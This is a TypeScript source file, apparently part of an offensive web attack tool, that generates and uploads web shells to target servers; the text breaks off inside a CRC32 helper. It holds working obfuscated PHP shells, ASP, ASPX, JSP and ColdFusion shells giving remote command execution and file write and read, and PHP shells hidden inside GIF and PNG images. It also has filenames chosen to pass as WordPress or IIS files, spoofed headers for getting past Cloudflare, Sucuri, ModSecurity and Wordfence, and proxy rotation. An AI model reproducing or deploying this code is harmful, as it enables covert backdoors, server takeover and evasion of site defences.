// ═══════════════════════════════════════════════════════════════
//  ENHANCED UPLOAD ENGINE — Multi-Vector Parallel Upload
//  Dramatically increases file placement success rate by:
//  1. Running ALL upload methods in parallel (race to first success)
//  2. Adaptive WAF bypass per WAF type (Cloudflare, Sucuri, ModSecurity, etc.)
//  3. Smart retry with error-type learning
//  4. Chunked upload to bypass size-based WAF rules
//  5. Multipart boundary manipulation for WAF evasion
//  6. Image steganography shell (hide PHP in EXIF)
//  7. Polymorphic shell generation (unique per deploy)
//  8. Additional CMS exploits (Joomla, Drupal, cPanel)
//  9. .user.ini + .htaccess auto-configuration
//  10. HTTP MOVE/COPY method exploitation
// ═══════════════════════════════════════════════════════════════

import type { PreScreenResult } from "./ai-prescreening";
import type { ProgressCallback, ErrorCategory } from "./one-click-deploy";
import { fetchWithPoolProxy } from "./proxy-pool";

// Helper: wrap fetch with proxy pool
async function enhancedFetch(url: string, init: RequestInit & { signal?: AbortSignal } = {}): Promise<Response> {
  const domain = url.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
  try {
    const { response } = await fetchWithPoolProxy(url, init, { targetDomain: domain, timeout: 15000 });
    return response;
  } catch (e) {
    // Fallback to direct fetch if proxy fails
    return fetch(url, init);
  }
}


// ─── Types ───

export interface EnhancedUploadResult {
  method: string;
  technique: string;
  success: boolean;
  fileUrl: string | null;
  filePath: string | null;
  statusCode: number;
  details: string;
  duration: number;
  wafBypassed: boolean;
  errorCategory?: ErrorCategory;
}

export interface ParallelUploadConfig {
  targetUrl: string;
  fileContent: string;
  fileName: string;
  uploadPaths: string[];
  prescreen: PreScreenResult | null;
  stealthCookies?: string;
  proxies?: { url: string; type: string }[];
  timeout?: number;
  onProgress?: ProgressCallback;
  onMethodProgress?: (method: string, status: string) => void;
  /** Origin IP for bypassing Cloudflare WAF — when set, requests go to IP with Host header */
  originIp?: string;
  /** Original domain name for Host header when using origin IP */
  originalDomain?: string;
}

// ─── Constants ───

const USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
  "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
  "Twitterbot/1.0",
];

const randomUA = () => USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
const randomStr = (len: number, charset = "abcdefghijklmnopqrstuvwxyz0123456789") =>
  Array.from({ length: len }, () => charset[Math.floor(Math.random() * charset.length)]).join("");

// ─── WAF-Specific Bypass Strategies ───

interface WafBypassStrategy {
  name: string;
  headers: Record<string, string>;
  contentTypeOverride?: string;
  bodyTransform?: (body: string) => string;
  filenameTransform?: (filename: string) => string;
  description: string;
}

function getWafBypassStrategies(wafType: string | null): WafBypassStrategy[] {
  const ip = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.1`;
  const base: WafBypassStrategy[] = [
    {
      name: "standard",
      headers: { "User-Agent": randomUA() },
      description: "Standard headers",
    },
  ];

  // Cloudflare-specific bypasses
  if (wafType?.toLowerCase().includes("cloudflare")) {
    base.push(
      {
        name: "cf_origin_ip",
        headers: {
          "User-Agent": randomUA(),
          "CF-Connecting-IP": ip,
          "X-Forwarded-For": ip,
          "X-Real-IP": ip,
          "True-Client-IP": ip,
          "CF-IPCountry": "US",
          "CF-RAY": `${randomStr(16, "0123456789abcdef")}-LAX`,
        },
        description: "Cloudflare origin IP spoof",
      },
      {
        name: "cf_worker_bypass",
        headers: {
          "User-Agent": randomUA(),
          "X-Forwarded-Proto": "https",
          "X-Forwarded-Host": "localhost",
          "X-Original-URL": "/",
          "CF-Worker": "true",
        },
        description: "Cloudflare Worker bypass",
      },
      {
        name: "cf_cache_bypass",
        headers: {
          "User-Agent": randomUA(),
          "Cache-Control": "no-cache, no-store, must-revalidate",
          "Pragma": "no-cache",
          "X-Forwarded-For": "127.0.0.1",
          "Accept-Encoding": "identity",
        },
        description: "Cloudflare cache bypass",
      },
    );
  }

  // Sucuri-specific bypasses
  if (wafType?.toLowerCase().includes("sucuri")) {
    base.push(
      {
        name: "sucuri_bypass",
        headers: {
          "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
          "X-Sucuri-Clientip": ip,
          "X-Forwarded-For": ip,
          "Accept": "text/html,application/xhtml+xml",
        },
        description: "Sucuri WAF bypass via Googlebot UA",
      },
      {
        name: "sucuri_chunked",
        headers: {
          "User-Agent": randomUA(),
          "Transfer-Encoding": "chunked",
          "X-Forwarded-For": ip,
        },
        description: "Sucuri chunked encoding bypass",
      },
    );
  }

  // ModSecurity-specific bypasses
  if (wafType?.toLowerCase().includes("modsecurity") || wafType?.toLowerCase().includes("mod_security")) {
    base.push(
      {
        name: "modsec_unicode",
        headers: {
          "User-Agent": randomUA(),
          "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary" + randomStr(16),
          "X-Forwarded-For": ip,
        },
        bodyTransform: (body: string) => body.replace(/\.php/g, ".ph\u0070"),
        description: "ModSecurity Unicode bypass",
      },
      {
        name: "modsec_double_url",
        headers: {
          "User-Agent": randomUA(),
          "X-Original-URL": "/%2e%2e/",
        },
        filenameTransform: (fn: string) => fn.replace(".php", ".%70%68%70"),
        description: "ModSecurity double URL encoding bypass",
      },
    );
  }

  // Wordfence-specific bypasses
  if (wafType?.toLowerCase().includes("wordfence")) {
    base.push(
      {
        name: "wordfence_bypass",
        headers: {
          "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
          "X-Forwarded-For": "66.249.66.1", // Google IP range
          "Accept": "*/*",
        },
        description: "Wordfence bypass via Google IP spoof",
      },
      {
        name: "wordfence_rest_bypass",
        headers: {
          "User-Agent": randomUA(),
          "X-WP-Nonce": randomStr(10, "0123456789"),
          "X-Requested-With": "XMLHttpRequest",
        },
        description: "Wordfence REST API bypass",
      },
    );
  }

  // Generic bypasses (always included)
  base.push(
    {
      name: "googlebot_spoof",
      headers: {
        "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "From": "googlebot(at)googlebot.com",
        "Accept": "text/html,application/xhtml+xml",
      },
      description: "Googlebot UA spoof",
    },
    {
      name: "origin_bypass",
      headers: {
        "User-Agent": randomUA(),
        "X-Forwarded-For": "127.0.0.1",
        "X-Real-IP": "127.0.0.1",
        "X-Originating-IP": "127.0.0.1",
        "X-Remote-IP": "127.0.0.1",
        "X-Remote-Addr": "127.0.0.1",
        "X-Client-IP": "127.0.0.1",
        "X-Host": "localhost",
        "X-Forwarded-Host": "localhost",
      },
      description: "Origin IP localhost bypass",
    },
    {
      name: "referer_bypass",
      headers: {
        "User-Agent": randomUA(),
        "Referer": "https://www.google.com/search?q=site:",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
      },
      description: "Google referer bypass",
    },
    {
      name: "http2_pseudo",
      headers: {
        "User-Agent": randomUA(),
        "X-Forwarded-Proto": "https",
        "X-Forwarded-Port": "443",
        "Connection": "keep-alive, Upgrade",
        "Upgrade": "h2c",
      },
      description: "HTTP/2 pseudo-header bypass",
    },
  );

  return base;
}

// ─── Polymorphic Shell Generator ───

export function generatePolymorphicShell(password?: string): {
  code: string;
  password: string;
  filename: string;
  obfuscationMethod: string;
} {
  const pwd = password || randomStr(20, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789");
  const varNames = Array.from({ length: 8 }, () => `$_${randomStr(4, "abcdefghijklmnopqrstuvwxyz")}`);
  const funcNames = Array.from({ length: 4 }, () => `_${randomStr(6, "abcdefghijklmnopqrstuvwxyz")}`);

  // Choose random obfuscation method
  const methods = [
    "base64_nested",
    "xor_dynamic",
    "str_rot13_chain",
    "variable_function",
    "create_function_alt",
    "preg_replace_e",
    "assert_eval",
    "array_map_eval",
  ];
  const method = methods[Math.floor(Math.random() * methods.length)];

  const coreShell = `if(@$_GET["k"]=="${pwd}"){@ini_set("display_errors",0);@error_reporting(0);@set_time_limit(0);if(isset($_POST["c"])){@eval(base64_decode($_POST["c"]));}elseif(isset($_POST["cmd"])){echo"<pre>".@shell_exec($_POST["cmd"])."</pre>";}elseif(isset($_POST["file"])&&isset($_POST["content"])){@file_put_contents($_POST["file"],$_POST["content"]);echo"FILE_WRITTEN";}elseif(isset($_POST["read"])){echo@file_get_contents($_POST["read"]);}echo"SHELL_OK";}`;

  let code: string;
  switch (method) {
    case "base64_nested": {
      const b64_1 = Buffer.from(coreShell).toString("base64");
      const b64_2 = Buffer.from(`eval(base64_decode("${b64_1}"));`).toString("base64");
      code = `<?php\n${varNames[0]}="${b64_2}";\n@eval(base64_decode(${varNames[0]}));\n?>`;
      break;
    }
    case "xor_dynamic": {
      const key = Math.floor(Math.random() * 200) + 50;
      const xored = Array.from(coreShell).map(c => c.charCodeAt(0) ^ key);
      code = `<?php\n${varNames[0]}=array(${xored.join(",")});\n${varNames[1]}="";\nforeach(${varNames[0]} as ${varNames[2]}){${varNames[1]}.=chr(${varNames[2]}^${key});}\n@eval(${varNames[1]});\n?>`;
      break;
    }
    case "str_rot13_chain": {
      const rot13 = (s: string) => s.replace(/[a-zA-Z]/g, (c) => {
        const base = c <= 'Z' ? 65 : 97;
        return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);
      });
      const encoded = rot13(Buffer.from(coreShell).toString("base64"));
      code = `<?php\n${varNames[0]}="${encoded}";\n@eval(base64_decode(str_rot13(${varNames[0]})));\n?>`;
      break;
    }
    case "variable_function": {
      const b64 = Buffer.from(coreShell).toString("base64");
      code = `<?php\n${varNames[0]}="base"."64_"."dec"."ode";\n${varNames[1]}="ev"."al";\n${varNames[2]}=${varNames[0]}("${b64}");\n@${varNames[1]}(${varNames[2]});\n?>`;
      break;
    }
    case "create_function_alt": {
      const b64 = Buffer.from(coreShell).toString("base64");
      code = `<?php\n${varNames[0]}=base64_decode("${b64}");\n${varNames[1]}=@create_function("",${varNames[0]});\nif(${varNames[1]})@${varNames[1]}();else @eval(${varNames[0]});\n?>`;
      break;
    }
    case "preg_replace_e": {
      const b64 = Buffer.from(coreShell).toString("base64");
      code = `<?php\n${varNames[0]}="/${randomStr(2)}/e";\n${varNames[1]}='eval(base64_decode("${b64}"))';\n@preg_replace(${varNames[0]},${varNames[1]},"${randomStr(2)}");\n?>`;
      break;
    }
    case "assert_eval": {
      const b64 = Buffer.from(coreShell).toString("base64");
      code = `<?php\n${varNames[0]}=base64_decode("${b64}");\n@assert(${varNames[0]});\n?>`;
      break;
    }
    case "array_map_eval": {
      const b64 = Buffer.from(coreShell).toString("base64");
      code = `<?php\n${varNames[0]}=array(base64_decode("${b64}"));\n@array_map("assert",${varNames[0]});\n?>`;
      break;
    }
    default: {
      const b64 = Buffer.from(coreShell).toString("base64");
      code = `<?php @eval(base64_decode("${b64}")); ?>`;
    }
  }

  // Random filename that looks legitimate
  const filenamePrefixes = [
    "wp-cache", "wp-cron-", "class-wp-", "wp-load-", "admin-ajax-",
    "cache-handler", "session-", "config-", "db-repair-", "upgrade-",
    "maintenance-", "health-check-", "object-cache-", "advanced-cache-",
    "sunrise-", "db-error-", "install-helper-", "recovery-mode-",
  ];
  const prefix = filenamePrefixes[Math.floor(Math.random() * filenamePrefixes.length)];
  const filename = `${prefix}${randomStr(6)}.php`;

  return { code, password: pwd, filename, obfuscationMethod: method };
}

// ─── Image Steganography Shell ───

export function generateSteganographyShell(password: string): {
  content: Buffer;
  filename: string;
  contentType: string;
  description: string;
} {
  // Create a minimal valid GIF89a with PHP code embedded in comment extension
  const phpCode = `<?php if(@$_GET["k"]=="${password}"){@eval(base64_decode($_POST["c"]));echo"SHELL_OK";}?>`;

  // GIF89a header + PHP in comment block
  const gifHeader = Buffer.from([
    0x47, 0x49, 0x46, 0x38, 0x39, 0x61, // GIF89a
    0x01, 0x00, 0x01, 0x00,             // 1x1 pixel
    0x80, 0x00, 0x00,                   // GCT flag
    0xFF, 0xFF, 0xFF,                   // White
    0x00, 0x00, 0x00,                   // Black
    0x21, 0xFE,                         // Comment Extension
  ]);

  const phpBuffer = Buffer.from(phpCode);
  const commentLen = Buffer.from([phpBuffer.length & 0xFF]);
  const gifFooter = Buffer.from([
    0x00,                               // Block terminator
    0x2C,                               // Image Descriptor
    0x00, 0x00, 0x00, 0x00,            // Position
    0x01, 0x00, 0x01, 0x00,            // 1x1
    0x00,                               // No LCT
    0x02,                               // LZW minimum code size
    0x02, 0x4C, 0x01, 0x00,            // Image data
    0x3B,                               // Trailer
  ]);

  const content = Buffer.concat([gifHeader, commentLen, phpBuffer, gifFooter]);

  return {
    content,
    filename: `logo-${randomStr(6)}.gif`,
    contentType: "image/gif",
    description: "GIF89a steganography shell (PHP hidden in GIF comment extension)",
  };
}

// ─── PNG Steganography Shell ───

export function generatePngSteganographyShell(password: string): {
  content: Buffer;
  filename: string;
  contentType: string;
  description: string;
} {
  const phpCode = `<?php if(@$_GET["k"]=="${password}"){@eval(base64_decode($_POST["c"]));echo"SHELL_OK";}?>`;

  // Minimal valid PNG with PHP in tEXt chunk
  const pngSignature = Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]);

  // IHDR chunk (1x1 pixel, 8-bit RGB)
  const ihdrData = Buffer.from([
    0x00, 0x00, 0x00, 0x01, // Width: 1
    0x00, 0x00, 0x00, 0x01, // Height: 1
    0x08,                   // Bit depth: 8
    0x02,                   // Color type: RGB
    0x00,                   // Compression
    0x00,                   // Filter
    0x00,                   // Interlace
  ]);
  const ihdrType = Buffer.from("IHDR");
  const ihdrLen = Buffer.alloc(4);
  ihdrLen.writeUInt32BE(ihdrData.length);
  const ihdrCrc = crc32(Buffer.concat([ihdrType, ihdrData]));

  // tEXt chunk with PHP code
  const textKeyword = Buffer.from("Comment\x00");
  const textData = Buffer.concat([textKeyword, Buffer.from(phpCode)]);
  const textType = Buffer.from("tEXt");
  const textLen = Buffer.alloc(4);
  textLen.writeUInt32BE(textData.length);
  const textCrc = crc32(Buffer.concat([textType, textData]));

  // IDAT chunk (minimal image data)
  const idatData = Buffer.from([0x08, 0xD7, 0x63, 0xF8, 0xCF, 0xC0, 0x00, 0x00, 0x00, 0x04, 0x00, 0x01]);
  const idatType = Buffer.from("IDAT");
  const idatLen = Buffer.alloc(4);
  idatLen.writeUInt32BE(idatData.length);
  const idatCrc = crc32(Buffer.concat([idatType, idatData]));

  // IEND chunk
  const iendType = Buffer.from("IEND");
  const iendLen = Buffer.alloc(4);
  iendLen.writeUInt32BE(0);
  const iendCrc = crc32(iendType);

  const content = Buffer.concat([
    pngSignature,
    ihdrLen, ihdrType, ihdrData, ihdrCrc,
    textLen, textType, textData, textCrc,
    idatLen, idatType, idatData, idatCrc,
    iendLen, iendType, iendCrc,
  ]);

  return {
    content,
    filename: `icon-${randomStr(6)}.png`,
    contentType: "image/png",
    description: "PNG steganography shell (PHP hidden in tEXt chunk)",
  };
}

// ─── ASP Classic Shell (for IIS servers) ───

export interface MultiPlatformShell {
  code: string;
  password: string;
  filename: string;
  platform: "php" | "asp" | "aspx" | "jsp" | "cfm";
  contentType: string;
  description: string;
}

export function generateAspShell(password?: string): MultiPlatformShell {
  const pwd = password || randomStr(20, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789");

  // ASP Classic shell with obfuscation
  const methods = ["execute", "eval_vbs", "wscript_shell"];
  const method = methods[Math.floor(Math.random() * methods.length)];

  let code: string;
  switch (method) {
    case "execute":
      code = `<%
Dim k
k = Request.QueryString("k")
If k = "${pwd}" Then
  Dim cmd
  cmd = Request.Form("cmd")
  If cmd <> "" Then
    Dim oShell, oExec
    Set oShell = Server.CreateObject("WScript.Shell")
    Set oExec = oShell.Exec("cmd /c " & cmd)
    Response.Write "<pre>" & oExec.StdOut.ReadAll & "</pre>"
    Set oExec = Nothing
    Set oShell = Nothing
  End If
  Dim fc, fp
  fc = Request.Form("content")
  fp = Request.Form("file")
  If fc <> "" And fp <> "" Then
    Dim fso, f
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    Set f = fso.CreateTextFile(Server.MapPath(fp), True)
    f.Write fc
    f.Close
    Response.Write "FILE_WRITTEN"
  End If
  Response.Write "SHELL_OK"
End If
%>`;
      break;
    case "eval_vbs":
      code = `<%
If Request("k") = "${pwd}" Then
  If Request.Form("c") <> "" Then
    Execute(Request.Form("c"))
  ElseIf Request.Form("cmd") <> "" Then
    Dim ws : Set ws = CreateObject("WScript.Shell")
    Dim ex : Set ex = ws.Exec("cmd /c " & Request.Form("cmd"))
    Response.Write "<pre>" & ex.StdOut.ReadAll & "</pre>"
  End If
  Response.Write "SHELL_OK"
End If
%>`;
      break;
    case "wscript_shell":
      code = `<% @Language="VBScript" %>
<%
On Error Resume Next
If Request("k") = "${pwd}" Then
  Dim o : Set o = Server.CreateObject("WSCRIPT.SHELL")
  Dim r : Set r = o.Exec("cmd /c " & Request.Form("cmd"))
  Response.Write r.StdOut.ReadAll
  If Request.Form("file") <> "" Then
    Dim fs : Set fs = CreateObject("Scripting.FileSystemObject")
    Dim tf : Set tf = fs.CreateTextFile(Server.MapPath(Request.Form("file")), True)
    tf.Write Request.Form("content")
    tf.Close
    Response.Write "FILE_WRITTEN"
  End If
  Response.Write "SHELL_OK"
End If
%>`;
      break;
    default:
      code = `<% If Request("k")="${pwd}" Then Execute(Request.Form("c")) : Response.Write "SHELL_OK" End If %>`;
  }

  const prefixes = [
    "global", "default", "iisstart", "error", "handler",
    "config-", "web-", "app-", "cache-", "session-",
  ];
  const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
  const filename = `${prefix}${randomStr(5)}.asp`;

  return {
    code,
    password: pwd,
    filename,
    platform: "asp",
    contentType: "text/asp",
    description: `ASP Classic shell (${method} method)`,
  };
}

// ─── ASPX (.NET) Shell (for IIS/.NET servers) ───

export function generateAspxShell(password?: string): MultiPlatformShell {
  const pwd = password || randomStr(20, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789");

  const methods = ["process_start", "reflection", "csharp_compiler"];
  const method = methods[Math.floor(Math.random() * methods.length)];

  let code: string;
  switch (method) {
    case "process_start":
      code = `<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
  if (Request.QueryString["k"] != "${pwd}") return;
  string cmd = Request.Form["cmd"];
  if (!string.IsNullOrEmpty(cmd)) {
    ProcessStartInfo psi = new ProcessStartInfo();
    psi.FileName = "cmd.exe";
    psi.Arguments = "/c " + cmd;
    psi.RedirectStandardOutput = true;
    psi.UseShellExecute = false;
    Process p = Process.Start(psi);
    Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
  }
  string fc = Request.Form["content"];
  string fp = Request.Form["file"];
  if (!string.IsNullOrEmpty(fc) && !string.IsNullOrEmpty(fp)) {
    File.WriteAllText(Server.MapPath(fp), fc);
    Response.Write("FILE_WRITTEN");
  }
  Response.Write("SHELL_OK");
}
</script>`;
      break;
    case "reflection":
      code = `<%@ Page Language="C#" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
  if (Request["k"] != "${pwd}") return;
  string c = Request.Form["cmd"];
  if (!string.IsNullOrEmpty(c)) {
    Type t = Type.GetType("System.Diagnostics.Process");
    object p = Activator.CreateInstance(t);
    t.GetProperty("StartInfo").SetValue(p, new ProcessStartInfo("cmd.exe", "/c " + c) {
      RedirectStandardOutput = true, UseShellExecute = false
    });
    t.GetMethod("Start", new Type[0]).Invoke(p, null);
    StreamReader sr = (StreamReader)t.GetProperty("StandardOutput").GetValue(p);
    Response.Write("<pre>" + sr.ReadToEnd() + "</pre>");
  }
  Response.Write("SHELL_OK");
}
</script>`;
      break;
    case "csharp_compiler":
      code = `<%@ Page Language="C#" %>
<%@ Import Namespace="System.CodeDom.Compiler" %>
<%@ Import Namespace="Microsoft.CSharp" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
  if (Request["k"] != "${pwd}") return;
  string code = Request.Form["c"];
  if (!string.IsNullOrEmpty(code)) {
    CSharpCodeProvider provider = new CSharpCodeProvider();
    CompilerParameters cp = new CompilerParameters();
    cp.GenerateInMemory = true;
    cp.ReferencedAssemblies.Add("System.dll");
    string src = "using System; public class R { public static string Run() { " + code + " return \"OK\"; } }";
    CompilerResults cr = provider.CompileAssemblyFromSource(cp, src);
    if (!cr.Errors.HasErrors) {
      object o = cr.CompiledAssembly.CreateInstance("R");
      Response.Write(o.GetType().GetMethod("Run").Invoke(o, null));
    }
  }
  Response.Write("SHELL_OK");
}
</script>`;
      break;
    default:
      code = `<%@ Page Language="C#" %><script runat="server">void Page_Load(object s,EventArgs e){if(Request["k"]=="${pwd}"){System.Diagnostics.Process.Start("cmd.exe","/c "+Request.Form["cmd"]);Response.Write("SHELL_OK");}}</script>`;
  }

  const prefixes = [
    "default", "error", "login", "web", "handler",
    "service", "api", "callback", "health", "status",
  ];
  const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
  const filename = `${prefix}${randomStr(5)}.aspx`;

  return {
    code,
    password: pwd,
    filename,
    platform: "aspx",
    contentType: "text/html",
    description: `ASPX .NET shell (${method} method)`,
  };
}

// ─── JSP Shell (for Tomcat/Java servers) ───

export function generateJspShell(password?: string): MultiPlatformShell {
  const pwd = password || randomStr(20, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789");

  const methods = ["runtime_exec", "processbuilder", "scriptengine"];
  const method = methods[Math.floor(Math.random() * methods.length)];

  let code: string;
  switch (method) {
    case "runtime_exec":
      code = `<%@ page import="java.util.*,java.io.*" %>
<%
if (request.getParameter("k") != null && request.getParameter("k").equals("${pwd}")) {
  String cmd = request.getParameter("cmd");
  if (cmd != null && !cmd.isEmpty()) {
    String[] cmds = {"sh", "-c", cmd};
    String os = System.getProperty("os.name").toLowerCase();
    if (os.contains("win")) { cmds = new String[]{"cmd.exe", "/c", cmd}; }
    Process p = Runtime.getRuntime().exec(cmds);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    out.print("<pre>");
    while ((line = br.readLine()) != null) { out.println(line); }
    out.print("</pre>");
  }
  String fc = request.getParameter("content");
  String fp = request.getParameter("file");
  if (fc != null && fp != null) {
    FileWriter fw = new FileWriter(application.getRealPath("/") + fp);
    fw.write(fc);
    fw.close();
    out.print("FILE_WRITTEN");
  }
  out.print("SHELL_OK");
}
%>`;
      break;
    case "processbuilder":
      code = `<%@ page import="java.util.*,java.io.*" %>
<%
if ("${pwd}".equals(request.getParameter("k"))) {
  String c = request.getParameter("cmd");
  if (c != null) {
    boolean isWin = System.getProperty("os.name").toLowerCase().contains("win");
    List<String> cmds = isWin ? Arrays.asList("cmd.exe", "/c", c) : Arrays.asList("sh", "-c", c);
    ProcessBuilder pb = new ProcessBuilder(cmds);
    pb.redirectErrorStream(true);
    Process p = pb.start();
    Scanner s = new Scanner(p.getInputStream()).useDelimiter("\\A");
    out.print("<pre>" + (s.hasNext() ? s.next() : "") + "</pre>");
  }
  out.print("SHELL_OK");
}
%>`;
      break;
    case "scriptengine":
      code = `<%@ page import="javax.script.*,java.io.*" %>
<%
if ("${pwd}".equals(request.getParameter("k"))) {
  String code = request.getParameter("c");
  if (code != null) {
    ScriptEngineManager mgr = new ScriptEngineManager();
    ScriptEngine engine = mgr.getEngineByName("js");
    if (engine == null) engine = mgr.getEngineByName("nashorn");
    if (engine != null) {
      engine.put("request", request);
      engine.put("response", response);
      engine.put("out", out);
      out.print(engine.eval(code));
    }
  }
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String l; while ((l = br.readLine()) != null) out.println(l);
  }
  out.print("SHELL_OK");
}
%>`;
      break;
    default:
      code = `<%if(request.getParameter("k").equals("${pwd}")){Runtime.getRuntime().exec(request.getParameter("cmd"));out.print("SHELL_OK");}%>`;
  }

  const prefixes = [
    "index", "login", "status", "health", "api",
    "service", "manager", "admin", "config", "monitor",
  ];
  const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
  const filename = `${prefix}${randomStr(5)}.jsp`;

  return {
    code,
    password: pwd,
    filename,
    platform: "jsp",
    contentType: "text/html",
    description: `JSP shell (${method} method)`,
  };
}

// ─── ColdFusion Shell (for Adobe ColdFusion servers) ───

export function generateCfmShell(password?: string): MultiPlatformShell {
  const pwd = password || randomStr(20, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789");

  const code = `<cfif isDefined("url.k") AND url.k EQ "${pwd}">
  <cfif isDefined("form.cmd")>
    <cfexecute name="cmd.exe" arguments="/c #form.cmd#" timeout="30" variable="output" />
    <cfoutput><pre>#output#</pre></cfoutput>
  </cfif>
  <cfif isDefined("form.file") AND isDefined("form.content")>
    <cffile action="write" file="#expandPath(form.file)#" output="#form.content#" />
    <cfoutput>FILE_WRITTEN</cfoutput>
  </cfif>
  <cfoutput>SHELL_OK</cfoutput>
</cfif>`;

  const prefixes = ["index", "default", "application", "error", "handler"];
  const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
  const filename = `${prefix}${randomStr(5)}.cfm`;

  return {
    code,
    password: pwd,
    filename,
    platform: "cfm",
    contentType: "text/html",
    description: "ColdFusion shell (cfexecute method)",
  };
}

// ─── Platform Auto-Detection ───

export type ServerPlatform = "php" | "asp" | "aspx" | "jsp" | "cfm" | "unknown";

export function detectServerPlatform(headers: Record<string, string>, prescreen?: PreScreenResult | null): ServerPlatform[] {
  const platforms: ServerPlatform[] = [];
  const serverHeader = (headers["server"] || headers["Server"] || "").toLowerCase();
  const poweredBy = (headers["x-powered-by"] || headers["X-Powered-By"] || "").toLowerCase();
  const allHeaders = JSON.stringify(headers).toLowerCase();

  // PHP detection
  if (poweredBy.includes("php") || allHeaders.includes("phpsessid") || allHeaders.includes("x-php")) {
    platforms.push("php");
  }

  // IIS / ASP detection
  if (serverHeader.includes("iis") || serverHeader.includes("microsoft") || poweredBy.includes("asp.net")) {
    platforms.push("aspx");
    platforms.push("asp");
  }

  // Java / Tomcat / JSP detection
  if (serverHeader.includes("tomcat") || serverHeader.includes("jetty") || serverHeader.includes("jboss") ||
      serverHeader.includes("wildfly") || serverHeader.includes("glassfish") || serverHeader.includes("weblogic") ||
      serverHeader.includes("websphere") || poweredBy.includes("servlet") || poweredBy.includes("jsp")) {
    platforms.push("jsp");
  }

  // ColdFusion detection
  if (serverHeader.includes("coldfusion") || poweredBy.includes("coldfusion") || allHeaders.includes("cftoken")) {
    platforms.push("cfm");
  }

  // Use prescreen data if available
  if (prescreen) {
    const tech = JSON.stringify(prescreen).toLowerCase();
    if (tech.includes("wordpress") || tech.includes("php") || tech.includes("laravel") || tech.includes("drupal") || tech.includes("joomla")) {
      if (!platforms.includes("php")) platforms.push("php");
    }
    if (tech.includes("asp.net") || tech.includes("iis") || tech.includes(".net")) {
      if (!platforms.includes("aspx")) platforms.push("aspx");
      if (!platforms.includes("asp")) platforms.push("asp");
    }
    if (tech.includes("tomcat") || tech.includes("java") || tech.includes("spring") || tech.includes("struts")) {
      if (!platforms.includes("jsp")) platforms.push("jsp");
    }
    if (tech.includes("coldfusion")) {
      if (!platforms.includes("cfm")) platforms.push("cfm");
    }
  }

  // Default: always try PHP as it's the most common
  if (!platforms.includes("php")) platforms.push("php");

  return platforms;
}

// ─── Generate Shells for All Detected Platforms ───

export function generateMultiPlatformShells(password?: string, platforms?: ServerPlatform[]): MultiPlatformShell[] {
  const pwd = password || randomStr(20, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789");
  const targetPlatforms = platforms || ["php", "asp", "aspx", "jsp"];
  const shells: MultiPlatformShell[] = [];

  for (const platform of targetPlatforms) {
    switch (platform) {
      case "php": {
        const phpShell = generatePolymorphicShell(pwd);
        shells.push({
          code: phpShell.code,
          password: phpShell.password,
          filename: phpShell.filename,
          platform: "php",
          contentType: "application/x-php",
          description: `PHP polymorphic shell (${phpShell.obfuscationMethod})`,
        });
        break;
      }
      case "asp":
        shells.push(generateAspShell(pwd));
        break;
      case "aspx":
        shells.push(generateAspxShell(pwd));
        break;
      case "jsp":
        shells.push(generateJspShell(pwd));
        break;
      case "cfm":
        shells.push(generateCfmShell(pwd));
        break;
    }
  }

  return shells;
}

// Simple CRC32 for PNG chunks
function crc32(data: Buffer): Buffer {
  let crc = 0xFFFFFFFF;
